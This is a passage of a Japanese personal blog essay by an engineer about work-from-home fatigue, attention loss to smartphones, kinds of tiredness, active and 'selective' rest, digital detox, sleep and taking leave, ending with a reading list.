そして恥は、自分で自分にかけている呪いだ。縛りである。しかし、呪いは、気づいた瞬間に弱くなる。注意力が商品化されるとは、人生に何が起きることなのかふと考えた。なぜ、こんなに疲れているのか。答えの一つは、私たちの注意力が「商品」として売買されているということだ。スマホを開く。通知が来る。タップする。広告が表示される。スクロールする。また通知が来る。この一連の行動の中で、私たちの「注意力」は企業に売り渡されている。そして企業はその注意力を広告主に売る。注意力が奪われることは、なぜ「時間」以上の損失なのか「時間が奪われている」という表現は、まだ甘い。時間は、失っても取り戻せる可能性がある。今日の2時間を失っても、明日の2時間で何かができる。少なくとも、時間は均質に見える。しかし注意力は違う。注意力とは、「今この瞬間に何を経験するか」を決める力だ。何に注意を向けるかが、何を経験するかを決める。何を経験するかが、何を記憶するかを決める。何を記憶するかが、自分が誰であるかを決める。つまり、注意力を奪われることは、経験を奪われることであり、記憶を奪われることであり、最終的にはアイデンティティを奪われることだ。2時間スマホをスクロールして過ごした後、何が残っているか。私の場合、ほとんど何も覚えていない。「何を見てたっけ」と思い返しても、断片的な画像がぼんやり浮かぶだけ。時間は確かに過ぎた。でも経験は残っていない。一方で、友人と2時間話した後は違う。「あの話、面白かったな」「あのとき笑ったな」と、具体的な場面が残っている。同じ2時間でも、記憶への定着度がまるで違う。スマホを見ることも、一応は「経験」だ。でも、受け身で流れてくる情報を処理するだけの経験と、自分で選んだ活動に没頭する経験では、残り方が違う。受け身の時間は、砂に書いた文字のように消えていく。時間泥棒ではなく、人生泥棒だ。なぜ人は自分の注意力の価値に無自覚なのか注意力は、意識しないと見えない。お金は数字として見える。時間は時計として見える。しかし注意力は、どこにも可視化されていない。そして注意力は、「使っている」という感覚がない。お金を使うとき、財布が軽くなる感覚がある。時間を使うとき、時計が進む感覚がある。しかし注意力を使うとき、何かが減っていく感覚は薄い。ただ、気づいたら疲れている。さらに問題なのは、注意力を奪う側が、その事実を隠すインセンティブを持っていることだ。SNSは「つながり」を売り物にする。「あなたの大切な人とつながるためのツール」。しかし実際には、あなたの注意力を広告主に売るためのツールだ。この真実は、マーケティングでは語られない。だから私たちは、自分の注意力が商品になっていることに気づかない。気づかないまま、どんどん売り渡していく。この構造に気づいても、人はなぜ抗えないのか気づいても、抗えない。これが最も絶望的な部分だ。理由の一つは、脳の報酬系がハックされているからだ。通知が来る。ドーパミンが出る。確認する。また通知が来る。この「不定期な報酬」は、脳にとって最も中毒性が高い。スロットマシンと同じ原理だ。いつ当たるか分からないから、ずっと引き続けてしまう。理由のもう一つは、社会的なプレッシャーだ。みんなが使っている。使わないと取り残される。返信しないと失礼。既読をつけないと心配される。SNSから離れることは、社会から離れることのように感じられる。そして最後の理由は、代替手段がないことだ。仕事の連絡もスマホで来る。友人との約束もスマホで確認する。情報収集もスマホでする。スマホを捨てることは、現代社会で生きることを諦めることに近い。構造的な問題には、個人の意志力だけでは対抗できない。だからこそ、意識的な「デジタルデトックス」が必要になる。完全に離れることはできなくても、時間を区切って距離を取る。それが、今できる最大の抵抗だ。オンライン会議は、なぜ「効率的なのに疲れる」のかスマホから注意を奪われるだけではない。在宅勤務の日常には、もう一つの消耗源がある。オンライン会議だ。最初はただ素晴らしいと思った。移動時間がない。どこからでも参加できる。効率的だ、と。でも二年、三年と続けるうちに、何かがおかしいと気づいた。ある日、オンライン会議が5本続いた後、私は何も考えられなくなっていた。画面を閉じても、頭の中がぼんやりしている。簡単なメールすら書けない。対面で5本会議しても、こんなに消耗しなかった。何かが違う。対面では無意識に処理していた情報とは何か対面のコミュニケーションでは、膨大な情報が交換されている。言葉だけではない。表情、視線、姿勢、身振り、声のトーン、間の取り方、呼吸のリズム、空間的な距離感。これらの非言語情報が、コミュニケーションの大部分を占めている。そして重要なのは、これらの情報を無意識に処理しているということだ。対面で話しているとき、相手の表情を「分析」しているわけではない。自然と読み取っている。相手が不快そうなら、無意識に話し方を変える。相手が興味を持っていそうなら、無意識に詳しく説明する。この調整は、意識的な努力なしに行われている。オンライン会議では、この無意識の処理が機能しなくなる。画面越しでは、表情が見えにくい。解像度が低い。タイムラグがある。視線が合わない（カメラを見ると相手の目を見られない）。空間的な距離感がない。全員が同じサイズで画面に並んでいる。無意識に処理できていた情報を、意識的に処理しなければならなくなる。「この人は今、何を考えているのだろう」「この沈黙は同意なのか、困惑なのか」「自分の話は伝わっているのか」。対面なら自動的に分かることが、オンラインでは分からない。だから脳がフル回転して、推測し、分析し、判断する。これが、オンライン会議の疲労の正体だ。さらに、自分の顔が常に画面に映っている。鏡を見ながら会話しているようなもの。音声も微妙に不完全で、脳は余計な労力を使う。同じ1時間でも、処理している情報の密度が違う。だから疲れる。私はこの疲労を個人の問題だと思っていた。でも違った。組織の設計そのものが、この疲労を生み出している。振り返ると、非同期のコミュニケーションで済むことを、わざわざ会議で行っていた。私自身、「対話が必要な場面」に限定することで、オンライン会議の負荷を減らせた。ある日、仕事を一つ担当から外してもらった。「これ、ちょっと抱えすぎてます」と正直に言った。その週、少しだけ頭がクリアだった。「手放してもいい」と思えた瞬間だった。境界線が消えたとき、人間の回復機構はどう壊れるのか在宅勤務で最も失われたもの。それは「境界線」だ。帰りたいのに家に居る。オフィスに通っていた頃は、自然と境界線があった。家を出る。通勤する。オフィスに着く。仕事モードになる。仕事が終わる。オフィスを出る。通勤する。家に着く。オフモードになる。この物理的な移動が、心理的な切り替えを助けていた。在宅勤務では、その境界線が消えた。起きたらすぐに仕事。寝る直前まで仕事。仕事部屋と寝室が同じ。リビングがオフィス。どこでも働ける = どこにも逃げ場がない。物理的な移動は、なぜ心理的切り替えに効いていたのか通勤を嫌う人は多い。満員電車。渋滞。時間の無駄。その通りだ。しかし通勤には、見えない機能があった。通勤は「儀式」だった。人間の脳は、儀式を通じて状態を切り替える。朝のルーティン、食事の作法、寝る前の習慣。これらの儀式が、脳に「次のモードに入る」というシグナルを送る。通勤は、最も強力な儀式の一つだった。家という空間を離れ、別の空間に移動する。その過程で、脳は自然と「仕事モード」に切り替わっていた。帰宅時には逆のプロセスが起きていた。この儀式が消えると、脳は切り替えのタイミングを失う。「いつ仕事を始めるべきか」「いつ仕事を終えるべきか」が曖昧になる。そして気づけば、常に「なんとなく仕事モード」で過ごすことになる。常に仕事モードということは、常に回復モードに入れないということだ。境界線がない働き方は、どんな人に特に危険か特に危険なのは、責任感が強い人と仕事が好きな人だ。「まだできることがある」と思うと止められない。楽しいから止められない。境界線がないと、いつまでも「まだやれる」と思ってしまう。個人の工夫と、その限界着替える。仕事着から部屋着に。あいさつを声に出す。「お疲れ様でした」。これらの小さな儀式が、切り替えを助ける。しかし、限界がある。本来、境界線は環境によって与えられていた。それを個人の意志で維持し続けることは、それ自体が消耗を伴う。だから、環境そのものを変える必要がある。 仕事専用の部屋を作る。コワーキングスペースを使う。PCを別の部屋に置く。物理的に「できない」状態を作る。意志力に頼らない仕組みを作ること。それが、境界線を維持する現実的な方法だ。「疲れた」と感じるとき、本当に疲れているのはどこか「疲れた」と口にする。でも、どこが疲れているのか、自分でも分かっていない。疲れには三つの種類がある。「自律神経の疲れ」。自律神経とは、意識しなくても働く神経システムだ。活動モードを司る交感神経（心拍を上げ、筋肉を緊張させる）と、休息モードを司る副交感神経（心拍を下げ、消化を促す）がある。この二つのバランスが崩れている状態。常に緊張している。リラックスできない。眠れない。朝起きても疲れが取れない。「心の疲れ」。精神的な消耗。ストレス。不安。焦り。人間関係の疲れ。感情労働による消耗。「体の疲れ」。筋肉の疲労。運動不足による倦怠感。同じ姿勢での身体の凝り。自律神経・心・身体のどれが最初に壊れやすいのかこれは個人差があるが、現代のエンジニアにとって、最初に壊れやすいのは自律神経だ。理由は、自律神経の疲労が最も気づきにくいからだ。身体の疲れは分かりやすい。筋肉痛がある。だるさがある。明確な感覚として認識できる。心の疲れも、ある程度は分かる。「イライラする」「落ち込む」「やる気が出ない」。感情として表れる。しかし自律神経の疲れは、症状が曖昧だ。「なんとなく調子が悪い」「眠れない」「食欲がない」「息苦しい」。これらの症状は、他の原因でも起きる。だから「自律神経が疲れている」とは認識されにくい。そして気づかないまま酷使し続けると、ある日突然、限界を超える。動悸がする。めまいがする。パニック発作が起きる。ここまで来て初めて「何かがおかしい」と気づく。自律神経は悲鳴を上げない。気づいたときには、もう限界を超えている。なぜ現代のエンジニアは三重苦に陥りやすいのか問題は、これらが複雑に絡み合っていることだ。長時間のデスクワークで体が疲れる。動かないから血流が滞り、肩が凝り、腰が痛くなる。AIへのキャッチアップ、締め切りのプレッシャー、評価への不安で心が疲れる。オンライン会議の連続、境界線のない働き方、常時接続のプレッシャーで自律神経が疲れる。これらは独立していない。相互に影響し合う。身体が疲れると、心も疲れやすくなる。運動不足はうつ病のリスクを高める。心が疲れると、自律神経が乱れる。ストレスは交感神経を活性化させる。自律神経が乱れると、身体の回復力が落ちる。悪循環のスパイラル。一つの疲れが、他の二つを引き起こし、それがまた最初の疲れを悪化させる。このスパイラルに入ると、自力で抜け出すのは難しい。疲れを誤診すると、どんな「間違った休み」を選ぶのか疲れの種類を見極めずに休もうとすると、的外れな対処をしてしまう。身体が疲れているのに、心の休息を取ろうとする。例えば、運動不足で身体が固まっているのに、マッサージに行ったり、リラクゼーション音楽を聴いたりする。これは悪くないが、根本解決にならない。必要なのは軽い運動だ。心が疲れているのに、身体の休息を取ろうとする。例えば、人間関係のストレスで消耗しているのに、ひたすら寝ようとする。眠れない。眠れても回復しない。必要なのは、安全な場所で感情を吐き出すことだ。自律神経が疲れているのに、刺激で気分転換しようとする。例えば、交感神経が過剰に活性化しているのに、アクション映画を観たり、激しいゲームをしたりする。一時的に気が紛れても、神経はさらに疲弊する。必要なのは、静かな環境でぼんやりすることだ。自分の疲れの種類を見極めること。それが、正しく休むための第一歩だ。身体がシャットダウンする「動けなさ」は、怠惰と何が違うのかベッドから起き上がれない朝がある。やるべきことは分かっている。でも体が動かない。これは怠けているのか。それとも、何か別のことが起きているのか。自分の「動けなさ」について考えていくうちに、気づいたことがある。怠惰と「動けなさ」は、外から見ると同じに見える。でも中身はまったく違う。怠惰は「やる気がない」状態だ。やろうと思えばできる。でもやりたくない。シャットダウンは「動けない」状態だ。やろうと思っても、身体が言うことを聞かない。脳が「これ以上は危険だ」と判断して、強制的にブレーキをかけている。これは生理的な反応だ。動物が捕食者に捕まったとき、最後の防衛反応として「死んだふり」をすることがある。身体を動かなくすることで、エネルギーを温存する。人間も同じメカニズムを持っている。ストレスが大きすぎて、闘うことも逃げることもできないとき、身体がシャットダウンする。社会はなぜこの状態を「甘え」と誤認するのか問題は、シャットダウン状態が外から見ると「怠けている」ように見えることだ。ベッドから起き上がれない。仕事に行けない。何もする気力がない。社会は、これを「意志の問題」として捉えがちだ。「頑張れば動ける」「やる気がないだけ」「甘えている」。しかし、これは生理的な反応だ。動物が捕食者に捕まったとき、最後の防衛反応として「死んだふり」をすることがある。これがシャットダウン反応だ。身体を動かなくすることで、エネルギーを温存し、捕食者の関心を逸らす。人間も同じメカニズムを持っている。ストレスが大きすぎて、闘うことも逃げることもできないとき、身体がシャットダウンする。これは意志の問題ではない。脳が「これ以上は危険だ」と判断して、強制的に止めているのだ。怠惰との違いは明確だ。怠惰は「やる気がない」状態。やろうと思えばできる。シャットダウン状態は「動けない」状態。やろうと思っても、身体が言うことを聞かない。この区別ができないと、本人も周囲も対応を間違える。本人が自分を責めることで、状態はどう固定化されるのか最も危険なのは、本人が自分を責めることだ。「動けないのは自分が怠けているからだ」「意志が弱いからだ」「努力が足りないからだ」。この自己批判が、状態をさらに悪化させる。自己批判はストレスを生む。ストレスは交感神経を活性化させる。しかし、すでに疲弊した身体は交感神経の活性化に耐えられない。だから、また身体がシャットダウンする。「動けない → 自分を責める → ストレス増加 → さらに動けなくなる → さらに自分を責める」この悪循環が、状態を固定化する。回復するためには、この循環を断ち切る必要がある。そのためにはまず、「動けないのは意志の問題ではない」と理解することが重要だ。 自分を責めることをやめる。これが、回復への第一歩だ。この凍結状態から抜けるには、何が最初の一歩になるのかシャットダウン状態から抜け出すのは、簡単ではない。「頑張って動く」というアプローチは逆効果になりうる。有効なのは、身体への穏やかなアプローチだ。まず、安全を感じること。物理的に安全な場所にいる。誰にも批判されない。時間的なプレッシャーがない。この「安全の感覚」が、安心・つながりモードを呼び起こす。次に、身体を少しだけ動かすこと。激しい運動ではない。深呼吸。ゆっくりとしたストレッチ。5分の散歩。これらの穏やかな動きが、身体に「動いても大丈夫だ」というシグナルを送る。そして、人とのつながり。信頼できる人との会話。これらの社会的なつながりが、安心・つながりモードを呼び起こす。重要なのは、「頑張る」のではなく「許す」ことだ。動けない自分を責めない。ゆっくり回復することを許す。無理に何かを達成しようとしない。このスタンスが、凍結状態から抜け出すための土台になる。私自身、過去の失敗をいつまでも反芻して、自分を追い詰めていた時期がある。でも気づいた。忘れることは、逃げではない。 嫌な記憶を手放すことで、初めて前に進める。回復とは、忘れるべきものを忘れられるようになることでもある。なぜ「何もしない休み」が回復にならない場合があるのか休息も、量を追い求めるだけでは意味がない。「長時間休んだ」という事実よりも、「どう休んだか」という質の方がずっと重要だ。休息には二つのタイプがある。「パッシブレスト（消極的休養）」。何もしない。寝る。横になる。身体を動かさない。これは従来の「休息」のイメージだ。「アクティブレスト（積極的休養）」。軽く身体を動かす。散歩する。ストレッチする。ヨガをする。能動的に身体を使うことで回復する。どちらが正解か、ではない。どちらが自分に足りていないかが問題だ。ただ、直感に反するが、現代のエンジニアにはアクティブレストの方が足りていない場合が多い。パッシブレストが逆効果になる条件は何かパッシブレストが逆効果になるのは、以下のような場合だ。身体が動かなすぎているとき。一日中座っていて、血流が滞っている。筋肉が固まっている。この状態でさらに横になっても、血流は改善しない。疲労物質は排出されない。むしろ、さらに滞留する。脳だけが疲れているとき。身体は使っていない。脳だけが酷使されている。この状態で「何もしない」と、身体と脳のアンバランスが解消されない。脳を休めるには、逆に身体を動かす方が効果的な場合がある。横になりながら刺激を受けているとき。ベッドでスマホを見ている状態。身体は休んでいるが、脳は休んでいない。これは休息ではない。むしろ、最悪の組み合わせだ。社会的な孤立状態のとき。一人で何もしない時間が長すぎると、孤独感が増す。孤独は心身に悪影響を与える。パッシブレストが孤独を深めるなら、逆効果だ。アクティブレストは、なぜ自律神経に効くのかアクティブレストが効果的な理由は、生理学的に説明できる。血流が改善する。軽い運動は心拍数を適度に上げ、血液循環を促進する。これにより、筋肉に蓄積した疲労物質が排出される。新鮮な酸素と栄養が全身に行き渡る。自律神経のバランスが整う。適度な運動は、交感神経と副交感神経の切り替えをスムーズにする。運動中は交感神経が優位になり、運動後は副交感神経が優位になる。このリズムが、自律神経の柔軟性を高める。脳の状態が変わる。運動は脳内のセロトニンやエンドルフィンの分泌を促す。これらの神経伝達物質は、気分を改善し、ストレスを軽減する。「運動後に気分がスッキリする」のは、この効果だ。睡眠の質が向上する。日中に適度に身体を動かすと、夜の睡眠が深くなる。これにより、睡眠中の回復効率が上がる。アクティブレストは、受動的な休息では得られない回復効果をもたらす。「休んでいるのに疲れる」行動には共通点があるか「休んでいるつもりなのに疲れる」行動を分析すると、共通点が見えてくる。脳への入力が続いている。スマホ、テレビ、SNS。これらは「受動的」に見えるが、脳は常に情報を処理している。休息ではなく、低負荷の作業だ。身体が動いていない。座っている。横になっている。血流が滞る。筋肉が固まる。代謝が落ちる。社会的なつながりがない。一人で画面に向かっている。人との会話がない。孤独が深まる。達成感がない。ただ時間が過ぎるだけ。何も生み出していない。何も経験していない。虚しさが残る。能動的に選ばなかった時間は、記憶に残らない。後から振り返っても、「何をしていたんだっけ」と思い出せない。これらを逆転させれば、「本当に休まる休息」が見えてくる。脳への入力を減らす。画面から離れる。静かな環境に身を置く。身体を動かす。散歩する。ストレッチする。軽い運動をする。人とつながる。会話をする。一緒に過ごす。達成感を得る。小さなことでいい。料理を作る。掃除をする。何かを「やった」という感覚を持つ。選択的休養という考え方「休む」というと、どうしても「消極的」なイメージがある。何もしない。停止する。エネルギーを使わない。でも、より効果的な休養の形がある。自分で選ぶ休養だ。休息は空いた時間を埋めるものではない。休息は設計対象だ。どう休むかを、自分で決める。「そんな時間ないよ」と思うかもしれない。でも、選択的休養は時間の量ではなく質の問題だ。30分でもいい。自分で選んだ30分は、誰かに決められた2時間より回復効果がある。選択的休養とは、自分の意志で、自分のために選んだ活動のことだ。ポイントは「自分で選ぶ」ことにある。誰かに言われてやるのではない。義務感でやるのではない。「やるべき」だからやるのではない。自分が「やりたい」と思って選ぶ。この「選ぶ」という行為自体が、回復をもたらす。なぜ「自分で選ぶ」ことに意味があるのか現代の疲労の多くは、選択権を奪われていることから来ている。仕事では、やるべきことが決まっている。締め切りがある。上司の指示がある。クライアントの要望がある。自分で選ぶ余地が少ない。プライベートでも、「やるべきこと」に追われている。家事、育児、介護、人付き合い。「自分のため」ではなく「誰かのため」に時間を使う。そして「空いた時間」にスマホを見る。これも、実は選択ではない。アルゴリズムが見せたいものを見せられている。自分で選んでいるようで、選ばされている。常に誰かに決められた行動をしている。だからこそ、「自分で選ぶ」ことに価値がある。自分で選んだ活動をしているとき、脳は「自分の人生をコントロールしている」と感じる。この感覚が、ストレスを軽減し、回復を促進する。逆に、誰かに決められた行動をしているとき、脳は「コントロールを失っている」と感じる。これがストレスの原因になる。選択的休養とは、人生の主導権を握り直すことだ。 そしてこれは、何を覚えておくかだけでなく、何を忘れるかを選ぶことでもある。AIは全てを記憶できる。でも人間は違う。だからこそ、意識的に手放す。追いかけなくていい情報を捨てる。キャッチアップしなくていい技術を諦める。その余白に、自分だけの発想が生まれる。選択的休養の条件選択的休養が効果的であるためには、いくつかの条件がある。自分で決めた。誰かに言われてではなく、自分の意志で選ぶ。「やらなければ」ではなく「やりたい」という動機。仕事とは関係ない。スキルアップのための勉強は選択的休養ではない。仕事に役立つ読書も違う。仕事と完全に切り離された活動。なぜなら、仕事に関連している限り、「成果を出さなければ」というプレッシャーがつきまとうからだ。没頭できる。時間を忘れて集中できる。義務感ではなく、純粋な興味や楽しさで取り組める。成長の実感がある（任意）。必須ではないが、少しずつ上達していく実感があると、より効果的だ。仕事以外の領域で「できるようになった」という経験は、自己効力感を高める。私の場合、それは楽器を弾くことと、格闘技のジムに通うことだった。ギターを弾く時間は、仕事とは無関係で、自分で決めた活動で、時間を忘れて没頭でき、少しずつ上達していく実感がある。格闘技のジムには、別の効果がある。自分一人では無限に追い込めない。だから、真剣にやる以外に選択肢がない環境に身を置く。スパーリング中は、仕事のことなど考えていられない。相手のパンチを避けることに全神経を集中させている。休む時は、可能な限り忘れる。 この忘却を強制してくれる環境が、私には必要だった。なぜ「楽ではないこと」が回復になるのかここで一つの逆説に気づく。格闘技は楽ではない。むしろ苦しい。汗をかく。息が切れる。翌日は筋肉痛だ。苦しいのに、なぜかジムの帰り道は頭が軽い。通い続けるうちに、分かってきた。私が選んだ苦しみは、喜びになる。考えてみれば不思議だ。ホラー映画、激辛料理、過酷な登山。人は日常では避けるはずの「痛み」や「恐怖」に、わざわざ金と時間を払って近づく。私も格闘技に月謝を払っている。殴られに行っている。なぜか。「選んだ苦痛」と「押しつけられた苦痛」は、まったく別物だからだ。仕事のストレス、人間関係の摩擦、将来への不安。これらは望んでいない。避けたいのに避けられない。コントロールできない。だから消耗する。格闘技の苦しさは違う。私が選んだ。いつでもやめられる。コントロールできる。だから同じ「苦しい」でも、片方は消耗で、片方は回復になる。そしてもう一つ気づいたことがある。楽なだけの人生は、たぶんつまらない。苦しみを避け続けた先に、充実はない。ベッドでスマホを見続ける週末は、苦しみをゼロにしようとする試みだ。でもそれは、意味もゼロにしてしまう。何も残らない。月曜日に「週末何してた？」と聞かれて、答えられない。格闘技は苦しい。でも意味がある。だから回復する。「楽であること」と「良いこと」は違う。 私はこれを、身体で学んだ。「ギターや格闘技なんて、自分には無理だ」と思うかもしれない。でも、選択的休養の本質は特定の活動ではない。「仕事の自分」とは別の自分に会いに行くことだ。ランニングでも料理でも将棋でも絵でも釣りでもいい。重要なのは、「仕事に役立つかもしれない」という思考を捨てること。 役に立たなくていい。役に立たないからこそ、純粋に楽しめる。その純粋さが、回復をもたらす。もう一つ、見つけ方のコツがある。周りに勧められたものを、何も考えずに始めてみる。自分で選ぼうとすると、「合うかな」「続くかな」と考えすぎて動けなくなる。友人が「一緒にやろう」と誘ってくれたら、とりあえず乗ってみる。合わなければやめればいい。始める前に悩むより、始めてから判断する方がずっと早い。「役に立たない」と思って捨てたものの中に、自分を救うものがある。デジタルデトックスという実践ある日、スマホを置いて散歩に出た。1時間後、頭が軽かった。そこで気づいた。私の疲労の大きな部分は、デジタル機器から来ていた。 正確には、デジタル機器が境界線を消し、常時接続状態を作り、注意力を奪い続けていた。全ての疲労がデジタル由来ではないが、デジタルが他の疲労を増幅させている。だからこそ、「デジタルデトックス」が必要だ。大げさなことではない。スマホを別の部屋に置く。一日一時間、画面を見ない時間を作る。寝る前の一時間はスマホを触らない。これだけでも効果がある。最初は落ち着かない。通知が気になる。何かを見逃しているような気がする。FOMO（見逃すことへの恐怖）が襲ってくる。この不快感こそが「摩擦」だ。 そして摩擦があるからこそ、その先にある回復は本物になる。でも、数日続けると気づく。別に何も見逃していない。大抵のことは、後から確認しても問題ない。「今すぐ」反応しなければならないことなど、実際にはほとんどない。そして画面から離れた時間に、不思議なことが起きる。頭がクリアになる。創造性が戻ってくる。ぼんやりと考えごとをする余裕が生まれる。有限であることを受け入れ、有限であるからこそできることを大切にする。デジタルから離れた時間は、人間としての有限性を肯定する時間だ。スマホを置いた瞬間、世界は何も変わらない。でも、自分だけが少し回復する。みんな、もっと真剣に休む方法を考えた方がいい。働き方は語られる。生産性は語られる。キャリアは語られる。でも休み方は、ほとんど語られない。「休めばいい」で片付けられる。それは違う。どう働くかと同じくらい、どう休むかは設計が必要なのだ。孤独という敵在宅勤務を続けていると、ある問題に直面する。孤独だ。孤独は好きだと思っていた。一人で考える時間、一人でコードを書く時間、誰にも邪魔されない自由。それを選んで在宅勤務を続けてきた。思えば、昔からそうだった。初対面だけは愛想がいい。すぐに打ち解ける。でも、それ以上は仲良くならない。小学生の頃から「一番仲の良い友達」というものがいなかった。人のことを、どこかで信用しきれない。だから深い関係を避けてきた。孤独は、選んだというより、そうなっていた。でも気づいた。私が「孤独を好んでいる」と思っていたのは、実は「人間関係の疲れから逃げていた」だけかもしれない、と。オンライン会議で消耗する。Slackで気を遣う。だから一人でいたくなる。これは「孤独を選んでいる」のではなく、「疲弊して引きこもっている」だけだ。健全な孤独と、不健全な孤独は違う。健全な孤独は、充電された状態から自分を選ぶこと。不健全な孤独は、消耗した状態から逃避すること。安心している状態から選ぶ孤独は健全だ。身体がシャットダウンした凍結状態としての孤独は、危険信号だ。休むためには、時に人とつながる必要がある。 矛盾しているようだが、社会的なつながりが足りていない状態では、一人でいても回復しない。孤独を選んでいるのか、孤独に追い込まれているのか。この違いを見極めることが、回復の分岐点になる。有給休暇を取るということ去年、有給休暇を40日以上残したまま年度が終わった。「有給どれくらい残ってる？」「40日以上」「俺も」。この会話を何度もした。笑い話みたいに。でも笑えない。40日間、自分のための時間を放棄したということだ。プロジェクトが忙しい。休むと仕事が溜まる。チームに迷惑がかかる。そう言い聞かせてきた。でも本当の理由は違う気がする。「休む理由がない」と思っていた。体調が悪いわけでもない。旅行の予定があるわけでもない。だから働く。この発想自体がおかしかったのだ。ある日、何の予定もなく有給を取ってみた。朝起きて、コーヒーを淹れて、本を読んで、散歩して、昼寝して、夕方になった。何も生産しなかった。何も達成しなかった。でも、妙に満たされていた。気づいたのは、「理由がないから休まない」は、「理由がないと自分を大切にしない」と同じだということ。病気になるまで働いて、やっと休む権利を得る。それは順序が逆だ。リモートワークでは、この問題がさらに深刻になる。どこでも働けるから、どこにいても「働いていない自分」に罪悪感を覚える。有給を取っても、Slackが気になる。結局PCを開いてしまう。有給休暇の本質は、「働かない時間を作る」ことではない。「働かない自分を許す練習」だ。睡眠という基盤深夜2時。また技術記事を読んでいる。「これだけ読んだら寝よう」と思って開いたブラウザのタブが、気づけば15個になっている。一つ読むと、関連記事が気になる。そっちを開く。また関連記事が出てくる。無限ループだ。睡眠が大事なことくらい、知っている。知っていて、毎晩削っている。「知っている」と「できる」の間には、深い溝がある。ある時期、睡眠時間が4時間を切る日が続いた。最初は平気だった。むしろ「自分は少ない睡眠でも動ける」と思っていた。でも二週間くらいで、明らかにおかしくなった。簡単なコードでミスを連発する。同じ箇所を何度も読み返す。会議で人の話が頭に入ってこない。睡眠不足は、自分では気づけない。認知機能が落ちているから、「認知機能が落ちている」ことを認知できない。これが一番怖いところだ。酔っ払いが「俺は酔ってない」と言うのと同じ構造。睡眠不足の人間は、自分が睡眠不足だと正しく判断できない。睡眠中、脳は単に休んでいるのではない。日中に入ってきた情報を整理し、不要なものを捨て、必要なものを定着させている。この作業が追いつかないと、頭の中がゴミ屋敷になる。思考がまとまらない。創造性が消える。読んだ本の内容が腑に落ちるのは、読んだ直後ではない。数日後、ふと「あれはこういうことだったのか」と分かる瞬間がある。その熟成には、睡眠が必要だ。睡眠を削ることは、未来の自分から時間を前借りしている。 利息は高い。そして返済は、体調不良という形でやってくる。今夜削る2時間は、来週のどこかで4時間になって返ってくる。しかも最悪のタイミングで。「効率を手放す」とは、エンジニアにとってどんな覚悟か私たちエンジニアは、効率を追求することに慣れている。コードを最適化する。プロセスを改善する。無駄を省く。それが仕事だ。でも、休息に効率を求めてはいけない。「最も効率的な休息法は何か」「最短時間で最大の回復効果を得るには」「休息の ROI を最大化するには」こういう発想自体が、休息を台無しにする。余暇にまでROIを求める病一日中「効率」を考えている。その思考パターンが、仕事以外の時間にも染み出してくる。無意識のうちに「この行動の費用対効果は」と考えてしまう。時間の希少性。仕事が忙しい。自由な時間が少ない。だから、その貴重な時間を「最大限に活用したい」と思う。無駄にしたくない。効率的に楽しみたい。成果主義の内面化。成果で評価される環境に長くいると、「成果がなければ価値がない」という信念が内面化される。休息も「何かを得るため」に行うべきだと思ってしまう。不安の回避。何もしないことが怖い。生産性がない自分に価値がないと感じる。だから、休息さえも「生産的」にしようとする。非効率な時間は、どんな価値を回復させるのかしかし、非効率な時間には、効率では得られない価値がある。余白から、ふとしたひらめきが生まれる。このブログの構成も、散歩中にふと浮かんだ。何かを「考えよう」としているときではなく、何も考えていないときに、頭が勝手に整理を始める。そして不思議なことに、この整理の過程で、脳は細部を手放している。細部を忘れているからこそ、異なる記憶同士が自由につながる。全部を完璧に覚えていたら、新しい組み合わせは生まれない。ぼんやりしている時間は、無駄ではなかった。自分を取り戻す時間になる。何かを達成するためではなく、ただ存在する時間。その時間の中で、「自分は何が好きなのか」「自分は何を大切にしたいのか」という問いに向き合える。人間らしさを回復する。効率を追求するのは機械の得意分野だ。非効率を楽しめるのは、人間だけの特権だ。 AIは目標を与えられると、最短経路で達成しようとする。しかし人間は、わざと遠回りすることができる。意味のないおしゃべり、下手な楽器演奏、勝てないゲーム。この「わざと非効率を選ぶ」能力は、目標最適化しかできないAIには原理的に不可能だ。非効率の中にこそ、最適化では見つからない価値がある。関係性を深める。人間関係は効率化できない。信頼を築くには時間がかかる。無駄話をする。一緒に何もしない時間を過ごす。これらの「非効率」が、関係性を深める。だから、休息に効率を求めることをやめよう。先週、何の目的もなく街を散策した。1時間、何も生産しなかった。スマホも持たずに、ただ歩いた。帰ってきたとき、妙に頭がすっきりしていた。非効率な時間を、堂々と楽しもう。それが、AI時代を生き抜くための、逆説的な戦略だ。AIは「無駄」を理解できない。だから、無駄を楽しめる人間は、永遠に代替されない。おわりにこの文章を書き終えて、日曜日の夜が終わろうとしている。正直に言うと、書いている間もスマホを何度か見た。通知を確認した。Xを開いた。自分で書いた「デジタルデトックス」の章を読み返しながら、その直後にスマホに手を伸ばしている自分がいた。笑えない。笑えないけど、それが現実だ。私はこの文章を書いたからといって、来週から完璧に休めるようになるわけではない。たぶん来週も、ベッドでスマホを見ながら「休んだつもり」になる日がある。境界線を引けない日がある。格闘技のジムをサボる日がある。でも、少しだけ違うことがある。「休めていない」と気づけるようになった。「これは回復じゃなくて消耗だ」と言語化できるようになった。 それだけでも、前よりマシなのだと思う。たぶん。AIは無限に働ける。私は有限だ。この事実は変わらない。でも、有限であることを恨まなくなった。有限だから、選ばなければならない。選ぶから、何が大事か分かる。全部はできない。全部は追いつけない。それでいい。それに、正直なところ、こうも思っている。どうせAIはこれからもっと賢くなる。 私たちの無能さを、いずれAIが補ってくれる。足りない部分を埋めてくれる。追いつけなかった技術も、AIが代わりにやってくれるようになる。だったら、その日まで健康で元気でいることの方が大事じゃないか。 壊れた身体では、優秀なAIを使いこなすこともできない。だから、選択的に休んでほしい。休むことは、負けを認めることじゃない。降参でもない。 有限な人間として、まともに機能し続けるための、当たり前の行為だ。当たり前のことを、当たり前にやる。それがこんなに難しいとは思わなかった。明日の朝、目覚ましが鳴る。月曜日が始まる。たぶん私は、また疲れている。でも、今日よりは少しだけマシかもしれない。少しだけ、回復の仕方を知っているから。少しだけ、自分を責めずに済むから。おい、休め。これは誰かへの命令じゃない。自分への、しつこい呼びかけだ。何度も忘れて、何度も思い出す。それでいい。完璧に続けることより、何度でも思い出せることの方が大事だから。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。参考書籍限りある時間の使い方作者:オリバー・バークマンかんき出版Amazonスタンフォード式　疲れない体作者:山田 知生サンマーク出版Amazon戦略的暇作者:森下彰大飛鳥新社Amazon休養学―あなたを疲れから救う作者:片野 秀樹東洋経済新報社Amazon疲労学: 毎日がんばるあなたのための作者:片野 秀樹東洋経済新報社Amazonスマホ脳（新潮新書） （『スマホ脳』シリーズ）作者:アンデシュ・ハンセン新潮社Amazon奪われた集中力: もう一度〝じっくり〟考えるための方法作者:ヨハン・ハリ作品社Amazonワイド新版　思考の整理学 (単行本 --)作者:外山　